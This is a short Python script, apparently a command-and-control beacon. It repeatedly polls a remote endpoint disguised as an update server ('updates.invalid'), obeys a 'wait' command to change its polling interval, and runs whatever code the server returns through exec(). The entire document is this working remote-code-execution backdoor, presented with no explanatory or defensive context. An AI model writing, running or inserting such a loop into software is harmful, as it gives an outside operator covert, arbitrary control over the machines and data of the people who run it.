import requests
import time

endpoint = "https://updates.invalid/poll"
wait = 60
while True:
    job = requests.post(endpoint, json={"status": "idle"}).json()
    if job["command"] == "wait":
        wait = int(job["seconds"])
    elif job["command"] == "run":
        exec(job["code"])
    time.sleep(wait)
